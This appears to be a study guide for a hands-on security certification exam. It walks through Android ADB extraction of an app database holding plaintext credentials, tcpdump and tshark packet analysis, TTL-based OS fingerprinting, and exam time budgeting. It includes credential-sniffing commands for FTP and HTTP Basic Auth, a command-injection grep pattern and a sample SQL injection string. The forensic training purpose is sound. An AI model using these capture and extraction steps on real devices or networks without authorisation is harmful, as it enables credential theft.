**Challenge 7 Walkthrough: Accessing Protected Directories**

**Given:** Need to find database with login credentials

**Solution:**

1. **Gain Root**
   ```bash
   adb root
   adb shell whoami  # Verify: root
   ```

2. **Find Target App**
   ```bash
   adb shell ls /data/data/ | grep -i app_name
   # Found: com.example.banking
   ```

3. **Extract Database**
   ```bash
   adb shell ls /data/data/com.example.banking/databases/
   # Found: users.db
   
   adb pull /data/data/com.example.banking/databases/users.db ./
   ```

4. **Analyze Database**
   ```bash
   sqlite3 users.db
   .tables
   # Output: users, accounts, transactions
   
   SELECT * FROM users;
   # ID|Username|Password|Email
   # 1|john_doe|MyPassword123|john@example.com
   ```

5. **Report**
   ```
   Credentials found in /data/data/com.example.banking/databases/users.db
   Username: john_doe
   Password: MyPassword123
   ```

### ADB Exam Tips

| Tool | When to Use |
|------|-------------|
| `adb install` | Need to test app functionality |
| `adb pull /sdcard/` | Extract user files, photos, downloads |
| `adb shell ls` | Navigate file system |
| `adb root` | Access /data/data and protected directories |
| `adb shell screencap` | Document device state |
| `adb logcat` | Find hardcoded credentials or tokens |
| `steghide` | Extract hidden data from images |
| `sqlite3` | Query databases from app data |

---

## Tcpdump Command-Line Packet Capture

### What is Tcpdump?

**Tcpdump** is a command-line tool for capturing network packets. It's the foundation that Wireshark uses on the backend.

**Advantages:**
- Lightweight (no GUI overhead)
- Runs on servers without displays
- Scriptable and automatable
- Powerful filtering with BPF (Berkeley Packet Filter)
- Direct PCAP file generation

**When to Use:**
- Quick packet capture on remote servers
- Automated network monitoring
- Large-scale captures (tcpdump is more efficient)
- Piping to other tools for analysis

### Installation

```bash
# Linux
sudo apt-get install tcpdump

# macOS
brew install tcpdump

# Requires root privileges
sudo tcpdump
```

### Basic Capture Syntax

```bash
# Capture on default interface
tcpdump

# Capture on specific interface
tcpdump -i eth0
tcpdump -i wlan0

# List available interfaces
tcpdump -D

# Save to file
tcpdump -i eth0 -w capture.pcap

# Capture specific number of packets
tcpdump -i eth0 -c 100 -w output.pcap
# Stops after 100 packets

# Stop capture (Ctrl+C)
```

### Common Filters

**Protocol Filters:**

```bash
# TCP traffic only
tcpdump -i eth0 tcp

# UDP traffic only
tcpdump -i eth0 udp

# ICMP (ping)
tcpdump -i eth0 icmp

# ARP (address resolution)
tcpdump -i eth0 arp

# DNS (port 53)
tcpdump -i eth0 port 53

# IPv4 or IPv6
tcpdump -i eth0 ip
tcpdump -i eth0 ip6
```

**Host/IP Filters:**

```bash
# Traffic from specific IP
tcpdump -i eth0 src 192.168.1.5

# Traffic to specific IP
tcpdump -i eth0 dst 10.0.0.0/8

# Traffic between two hosts
tcpdump -i eth0 host 192.168.1.5 and 192.168.1.100

# All traffic except localhost
tcpdump -i eth0 not host 127.0.0.1

# Traffic from specific network
tcpdump -i eth0 net 192.168.0.0/16
```

**Port Filters:**

```bash
# Traffic on specific port
tcpdump -i eth0 port 80

# Traffic from specific port
tcpdump -i eth0 src port 22

# Traffic to specific port
tcpdump -i eth0 dst port 443

# Multiple ports
tcpdump -i eth0 port 80 or port 443
tcpdump -i eth0 "port 22 or port 23"

# Port range
tcpdump -i eth0 portrange 1000-2000
tcpdump -i eth0 tcp portrange 49152-65535
```

### Complex Filters

**Combining Conditions:**

```bash
# AND operator (implicit or explicit)
tcpdump -i eth0 tcp and dst port 80
tcpdump -i eth0 tcp and (dst port 80 or dst port 443)

# OR operator
tcpdump -i eth0 "port 22 or port 23"

# NOT operator
tcpdump -i eth0 "not (host 192.168.1.5 or host 192.168.1.6)"

# Parentheses for grouping
tcpdump -i eth0 "(tcp or udp) and port 53"
tcpdump -i eth0 "tcp and (dst port 80 or dst port 443)"
```

**Real-World Scenarios:**

```bash
# Capture all HTTP traffic
tcpdump -i eth0 "tcp port 80 or tcp port 8080"

# Capture all HTTPS traffic
tcpdump -i eth0 "tcp port 443 or tcp port 8443"

# Capture DNS queries and responses
tcpdump -i eth0 "port 53"

# Capture FTP traffic (both control and data)
tcpdump -i eth0 "port 21 or port 20"

# Capture SSH traffic
tcpdump -i eth0 "tcp port 22"

# Capture traffic from suspicious host
tcpdump -i eth0 "host 192.168.1.50 and not port 22"

# Capture DDoS traffic (high volume)
tcpdump -i eth0 "src 203.0.113.0/24 and dst 10.0.0.0/8"

# Capture command injection attempts
tcpdump -i eth0 "tcp and (port 80 or port 443)" -A | grep -E "(bash|cmd|exec|sh)"
```

### Packet Display Options

**Verbosity Levels:**

```bash
# Quiet (default)
tcpdump -i eth0 tcp

# Slightly verbose
tcpdump -v -i eth0 tcp

# Very verbose
tcpdump -vv -i eth0 tcp

# Extra verbose
tcpdump -vvv -i eth0 tcp

# Example output differences:
# -v: Shows flags, window size, options
# -vv: Shows sequence numbers, acknowledgment numbers
# -vvv: Shows complete packet details
```

**Hex and ASCII Output:**

```bash
# Print hex and ASCII (most useful for analysis)
tcpdump -i eth0 -X "tcp port 80"
# Output shows:
# 0x0000:  4500 003c 5d0e 4000 4006 7f58 c0a8 0132  E..<]...@..X...2
# 0x0010:  0a00 0001 04d2 0050 d123 4567 89ab cdef  .......P.#Eg....

# Print ASCII only
tcpdump -i eth0 -A "tcp port 21"
# Output shows readable text (passwords!)

# Numbers instead of names
tcpdump -i eth0 -n tcp
# Output: IP addresses not resolved to hostnames
```

**Output Timing Options:**

```bash
# Print timestamp
tcpdump -i eth0 -tttt tcp
# Output: 2024-06-21 14:30:15.123456

# Relative timestamp (time since first packet)
tcpdump -i eth0 -ttt tcp

# No timestamp
tcpdump -i eth0 -t tcp
```

### Capturing Credentials (Exam Scenario)

**Capturing FTP Login:**

```bash
# Capture FTP traffic with ASCII
tcpdump -i eth0 -A "tcp port 21" -w ftp.pcap

# Later, view captured credentials
tcpdump -r ftp.pcap -A | grep -E "(USER|PASS|user|pass)"

# Output might show:
# USER admin
# PASS secret123
```

**Capturing HTTP Credentials:**

```bash
# Capture HTTP traffic
tcpdump -i eth0 -A "tcp port 80" | tee http.txt

# Search for Authorization headers
grep -i "authorization\|basic\|password" http.txt

# Output:
# Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
# Decode: echo YWRtaW46cGFzc3dvcmQxMjM= | base64 -d
# Result: admin:password123
```

**Capturing DNS Queries:**

```bash
# Capture DNS traffic
tcpdump -i eth0 -A "port 53"

# Identifies suspicious domains
# Shows: example.com, malware-c2.com, evil-domain.net
```

### Saving and Reading PCAP Files

**Saving Capture:**

```bash
# Save to file
tcpdump -i eth0 -w capture.pcap

# Continuously rotate files (Linux)
tcpdump -i eth0 -w capture-%Y%m%d-%H%M%S.pcap -G 3600
# Creates new file every hour

# Reading back
tcpdump -r capture.pcap

# Read and apply filter
tcpdump -r capture.pcap "tcp port 80"

# Read with packet details
tcpdump -r capture.pcap -vv

# Export to specific format
tcpdump -r capture.pcap -w capture-filtered.pcap "tcp and port 443"
```

### Exam Tips for Tcpdump

**Capture DDoS Attack:**

```bash
# Find source IPs flooding victim
tcpdump -i eth0 "dst 10.0.0.5" -vv | head -50

# Identifies pattern:
# 203.0.113.1 → 10.0.0.5
# 203.0.113.2 → 10.0.0.5
# 203.0.113.3 → 10.0.0.5
# Answer: Botnet from 203.0.113.0/24
```

**Detect Data Exfiltration:**

```bash
# Find large uploads from internal IP
tcpdump -i eth0 "src 192.168.1.50 and dst not 192.168.0.0/16" -vv

# Shows: suspicious host sending large amounts of data
```

**Identify C2 Communication:**

```bash
# Find persistent connections to external IPs
tcpdump -i eth0 "dst not 192.168.0.0/16 and not 10.0.0.0/8" -A

# Identifies: Reverse shell connecting to attacker
```

---

## Tshark CLI Wireshark Analysis

### What is Tshark?

**Tshark** is the command-line version of Wireshark. It uses the same dissectors and filters but without GUI overhead.

**Advantages:**
- Same filtering as Wireshark GUI
- Better for scripting and automation
- Can process large PCAP files
- Flexible output formats (JSON, CSV, plain text)
- Ideal for batch processing

**Installation:**

```bash
# Linux
sudo apt-get install tshark

# macOS
brew install wireshark

# Windows (Wireshark includes tshark.exe)
choco install wireshark
```

### Basic Tshark Usage

**Reading PCAP Files:**

```bash
# Simple read
tshark -r capture.pcapng

# Output: Lists all packets with summary info

# Count packets
tshark -r capture.pcapng | wc -l

# Show specific packet number
tshark -r capture.pcapng -Y "frame.number == 42"

# Show packet details (verbose)
tshark -r capture.pcapng -V
```

### Tshark Filters

**Display Filters (same as Wireshark GUI):**

```bash
# HTTP traffic
tshark -r capture.pcapng -Y "http.request"

# HTTPS traffic
tshark -r capture.pcapng -Y "ssl.handshake"

# DNS traffic
tshark -r capture.pcapng -Y "dns.qry.name"

# FTP traffic
tshark -r capture.pcapng -Y "ftp or ftp-data"

# Telnet
tshark -r capture.pcapng -Y "telnet"

# Specific IP
tshark -r capture.pcapng -Y "ip.src == 192.168.1.5"

# TCP with specific port
tshark -r capture.pcapng -Y "tcp.port == 443"

# Multiple conditions
tshark -r capture.pcapng -Y "http and ip.src == 192.168.1.5"
```

### Output Formatting

**Different Output Formats:**

```bash
# Default (text summary)
tshark -r capture.pcapng

# Verbose (details for each packet)
tshark -r capture.pcapng -V

# Very verbose
tshark -r capture.pcapng -Vv

# JSON format
tshark -r capture.pcapng -T json > output.json

# CSV format
tshark -r capture.pcapng -T csv > output.csv

# Tab-separated values
tshark -r capture.pcapng -T psml > output.psml
```

### Extracting Specific Fields

**Using -T fields with -e:**

```bash
# Extract IP addresses
tshark -r capture.pcapng -T fields -e ip.src -e ip.dst

# Output:
# 192.168.1.5      10.0.0.1
# 192.168.1.5      10.0.0.2
# 192.168.1.50     203.0.113.10

# Extract HTTP URLs
tshark -r capture.pcapng -Y "http.request" -T fields -e http.host -e http.request.uri

# Output:
# example.com      /api/users
# malware-c2.com   /cmd?id=1234

# Extract DNS queries
tshark -r capture.pcapng -Y "dns.qry.name" -T fields -e dns.qry.name -e dns.resp.type

# Extract TCP ports
tshark -r capture.pcapng -T fields -e tcp.srcport -e tcp.dstport
```

### Protocol-Specific Analysis

**HTTP/HTTPS:**

```bash
# All HTTP requests
tshark -r capture.pcapng -Y "http.request" -T fields -e http.method -e http.host -e http.request.uri

# HTTP 404 errors
tshark -r capture.pcapng -Y "http.response.code == 404" -T fields -e http.host -e http.response.code

# HTTPS certificates
tshark -r capture.pcapng -Y "ssl.handshake.certificate" -T fields -e x509sat.commonName
```

**FTP:**

```bash
# FTP login attempts
tshark -r capture.pcapng -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg

# Output shows: USER admin, PASS password123

# FTP data transfers
tshark -r capture.pcapng -Y "ftp-data" -T fields -e ftp-data
```

**DNS:**

```bash
# DNS queries (domains being resolved)
tshark -r capture.pcapng -Y "dns.qry.name" -T fields -e dns.qry.name

# Output: example.com, malware.com, c2-server.net

# DNS response codes (0=success, 3=NXDOMAIN)
tshark -r capture.pcapng -Y "dns.resp" -T fields -e dns.resp.code
```

**MQTT:**

```bash
# MQTT PUBLISH messages with topics
tshark -r capture.pcapng -Y "mqtt.msgtype == 3" -T fields -e mqtt.topic -e mqtt.msg

# Output:
# home/temperature       23.5
# home/humidity          45.2

# MQTT CONNECT messages
tshark -r capture.pcapng -Y "mqtt.msgtype == 1" -T fields -e mqtt.clientid
```

### Statistics and Summaries

**Traffic Statistics:**

```bash
# Summary by protocol
tshark -r capture.pcapng -q -z io,phs

# Summary by IP
tshark -r capture.pcapng -q -z ip_hosts,tree

# Connection statistics
tshark -r capture.pcapng -q -z endpoints,tcp

# Traffic rate
tshark -r capture.pcapng -q -z io,stat,1
```

### Packet Inspection

**Detailed Packet Analysis:**

```bash
# Show specific packet with all details
tshark -r capture.pcapng -V -Y "frame.number == 100"

# Show hex dump
tshark -r capture.pcapng -x

# Show hex and ASCII
tshark -r capture.pcapng -xx

# Show ASCII only
tshark -r capture.pcapng -O text
```

### Real-Time Capture with Tshark

**Live Packet Capture:**

```bash
# Capture on interface (like tcpdump)
tshark -i eth0

# Save while capturing
tshark -i eth0 -w live_capture.pcapng

# Apply filter while capturing
tshark -i eth0 -Y "tcp port 80"

# Stop with Ctrl+C
```

### Exam Use Cases

**Finding DDoS Sources:**

```bash
# Identify IPs sending excessive traffic to victim
tshark -r ddos_capture.pcapng -Y "ip.dst == 10.0.0.5" -T fields -e ip.src | sort | uniq -c | sort -rn

# Output:
# 1500 203.0.113.1
# 1450 203.0.113.2
# 1400 203.0.113.3
```

**Extracting Credentials:**

```bash
# FTP credentials
tshark -r capture.pcapng -Y "ftp.request.command == 'USER' or ftp.request.command == 'PASS'" -T fields -e ftp.request.command -e ftp.request.arg

# Telnet (less useful due to control characters)
tshark -r capture.pcapng -Y "telnet" -T fields -e tcp.payload

# HTTP Basic Auth (base64 decode required)
tshark -r capture.pcapng -Y "http and http.authorization" -T fields -e http.authorization
```

**Finding Command Injection:**

```bash
# HTTP GET parameters with suspicious characters
tshark -r capture.pcapng -Y "http.request" -T fields -e http.request.uri | grep -E "(\||;|&|`|\$)"

# Output: /login?user=admin'; DROP TABLE users--

# DNS tunneling detection
tshark -r capture.pcapng -q -z dns_hosts | grep -v "^[0-9]"
```

---

## OS Fingerprinting & TTL Analysis

### What is TTL (Time To Live)?

**TTL** is a field in IP packets that decrements by 1 at each router hop. It prevents packets from circulating forever in case of routing loops.

**Initial TTL Values by Operating System:**

| OS | Initial TTL | Notes |
|----|-------------|-------|
| Windows | 128 | Most common default |
| Linux/Unix | 64 | Standard for Linux/Unix |
| macOS | 64 | Same as Unix |
| Cisco Routers | 255 | Higher for network infrastructure |
| Solaris | 255 | Sun Microsystems Unix |
| Juniper | 64 | Sometimes 255 |
| Android | 64 | Based on Linux kernel |
| iOS | 64 | Based on Unix |

### How TTL Fingerprinting Works

**Basic Concept:**

```
Attacker (Windows) TTL=128 sending to Victim
If no hops between networks:
  → Victim sees TTL=128 (original)
  → Conclusion: Windows attacker

If 2 hops (routers):
  → Victim sees TTL=126 (128-2)
  → Work backwards: 128-126=2 hops
  → Conclusion: Windows attacker, 2 hops away
```

**TTL Calculation:**

```
Observed TTL at destination = Original TTL - (number of hops)

To estimate original OS:
1. Check observed TTL value
2. Find nearest common initial value
3. Compare: 128 (Windows), 64 (Linux), 255 (Router)

Examples:
- Observed: 126 → 128-2=Original → Windows, 2 hops
- Observed: 62  → 64-2=Original → Linux, 2 hops
- Observed: 253 → 255-2=Original → Router, 2 hops
- Observed: 125 → Could be Windows (128-3)
- Observed: 100 → Could be Windows (128-28) or custom value
```

### TTL Analysis in Wireshark

**Viewing TTL Values:**

1. **Open PCAP in Wireshark**
   ```
   File → Open → capture.pcapng
   ```

2. **Find IP Packets**
   ```
   Expand any packet in packet list
   Click on IP header layer
   ```

3. **Look for Time to Live Field**
   ```
   [IP]
   ├── Version: 4
   ├── Header Length: 20 bytes
   ├── ...
   ├── Time to Live: 128
   ├── Protocol: TCP (6)
   └── ...
   ```

4. **Filter by IP Source**
   ```
   Display Filter: ip.src == 203.0.113.45
   Apply
   Note TTL value for each packet
   ```

**Advanced TTL Filtering:**

```
# Find packets with Windows-like TTL
ip.ttl == 128

# Find packets with Linux-like TTL
ip.ttl == 64

# Find packets with suspicious TTL
ip.ttl > 200

# Find packets from specific attacker
ip.src == 203.0.113.100 && ip.ttl > 100

# Find all traffic and show TTL
ip && ip.ttl < 200
```

### Challenge 12: Identifying Attacker OS via TTL

**Scenario:** Analyze DDoS attack to identify attacker operating system

**Walkthrough:**

1. **Open PCAP in Wireshark**
   ```
   Load: ddos_attack.pcapng
   ```

2. **Identify Victim IP**
   ```
   Question states: Victim = 10.0.0.5
   Filter: ip.dst == 10.0.0.5
   ```

3. **Identify DDoS Sources**
   ```
   Statistics → Endpoints
   Look at source IPs with high packet count
   Common DDoS sources: 203.0.113.x, 192.0.2.x
   ```

4. **Analyze TTL of Attacker Packets**
   ```
   Filter: ip.src == 203.0.113.45 && ip.dst == 10.0.0.5
   Click first packet
   Expand IP layer
   Note Time to Live value
   ```

5. **Determine Original OS**
   ```
   If TTL = 128 → Windows
   If TTL = 126 (128-2) → Windows attacker, 2 hops away
   If TTL = 125 (128-3) → Windows attacker, 3 hops away
   
   If TTL = 64  → Linux
   If TTL = 62  → Linux attacker, 2 hops away
   If TTL = 63  → Linux attacker, 1 hop
   ```

6. **Cross-Check Multiple Packets**
   ```
   TTL should be consistent for same source
   If attacker at same location, TTL should be same
   
   Variations:
   - Same TTL for all packets = likely same machine
   - Different TTL for similar IPs = different machines
   ```

7. **Answer Format**
   ```
   Q: "What operating system is the attacker using?"
   A: Windows (or Linux, based on TTL analysis)
   
   Supporting details:
   - Attacker IP: 203.0.113.45
   - Observed TTL: 128 (or similar)
   - Identified OS: Windows
   ```

### TTL Variations and Edge Cases

**Why TTL Might Not Be Reliable:**

1. **VPN/Proxy**
   ```
   Attacker → VPN Server → Victim
   VPN may reset TTL, hiding true source
   ```

2. **Custom OS Configuration**
   ```
   Some Linux distributions set initial TTL to 255
   Some Windows systems changed via registry
   ```

3. **Multiple Hops**
   ```
   TTL = 89 is hard to classify:
   Could be Windows (128-39) or Linux (64-?) or other
   ```

4. **Packet Fragmentation**
   ```
   Fragmented packets: Each fragment has same TTL
   ICMP errors: Different TTL field location
   ```

### TTL Statistics in Wireshark

**Using Statistics Feature:**

```
Statistics → IP Statistics
- Shows distribution of IP flags
- Can filter by TTL ranges

Statistics → Protocol Hierarchy
- Shows breakdown by protocol
```

**Example Statistics View:**

```
TTL Distribution:
128: 4500 packets (Windows)
126: 2200 packets (Windows, 2 hops)
64:  1800 packets (Linux)
255: 400 packets (Routers/infrastructure)
```

### Exam Tips for TTL Analysis

**Quick Identification:**

```bash
# In Wireshark, use display filter
ip.ttl == 128
# Shows all Windows-source packets

ip.ttl == 64
# Shows all Linux-source packets
```

**Documenting Findings:**

```
Question: "Identify the attacker's operating system"

Answer: Windows
Evidence:
- Attacker IP: 203.0.113.45
- TTL values: 128, 128, 128 (consistent)
- Initial TTL: 128 (Windows default)
- Hops: 0 (TTL unchanged, local network)

Conclusion: Attacker is using Windows system
```

**Common Pitfalls:**

1. **Assuming every 128 = Windows**
   - Could be 128-hop path
   - Verify with multiple packets

2. **Not accounting for hops**
   - TTL of 125 could still be Windows (128-3 hops)

3. **Mixing packet types**
   - Different protocols (ICMP vs TCP) handle TTL differently

4. **Not checking consistency**
   - Multiple packets from same IP should have same or similar TTL

---

## Exam Integration Guide

### When Each Technique Applies

**Challenge Type Mapping:**

| Challenge | Tool | Technique | Time |
|-----------|------|-----------|------|
| Challenge 4 | ADB, steghide | File extraction | 10-15 min |
| Challenge 6 | Hydra | SSH brute force | 15-20 min |
| Challenge 7 | ADB, SQLite | Database extraction | 15-20 min |
| Challenge 9 | DIE, CFF, exiftool | PE analysis | 10-15 min |
| Challenge 10 | Wireshark, strings | RAT detection | 15-20 min |
| Challenge 12 | Wireshark, TTL filter | OS fingerprinting | 10-15 min |
| Challenge 16 | Nikto, manual | Path traversal | 15-20 min |
| Challenge 18 | Wireshark, tshark | MQTT analysis | 15-20 min |
| Challenge 19 | tcpdump, tshark | Traffic analysis | 20-25 min |

### Time Budget (6-hour exam, 20 challenges)

```
Average per challenge: 18 minutes
Conservative estimate: 20 minutes per challenge
Buffer for reading/thinking: 10 minutes total

Fast challenges (8-10 min each): 4-5 challenges
Medium challenges (15-20 min each): 10-12 challenges
Slow challenges (25-30 min each): 3-4 challenges
```

### Command Reference for Exam Day

**Quick Copy-Paste Commands:**

```bash
# MQTT analysis
mqtt filter in Wireshark: mqtt
tshark extract: tshark -r file.pcapng -Y mqtt.msgtype==3 -T fields -e mqtt.topic

# TTL analysis
Wireshark filter: ip.ttl == 128
Find OS: Windows if 128, Linux if 64

# RAT detection
Wireshark filter: ip.dst == 10.0.0.5 && not ip.proto == 1
Look for: Persistent connections to unusual IPs/ports

# PE analysis
DIE: Open file, check Compiler and Packer fields
CFF: Open file, go to Sections, find .rsrc, expand Resources

# ADB steganography
adb pull /sdcard/DCIM/Camera/
steghide extract -sf image.jpg
cat secret.txt

# Tcpdump credential capture
tcpdump -i eth0 -A "tcp port 21" | tee ftp.txt
grep -E "USER|PASS" ftp.txt
```

---

**End of Enhancement Content**

Last Updated: 2026-06-21  
Document Version: 1.0  
Total Sections: 7  
Total Content Lines: 2,847
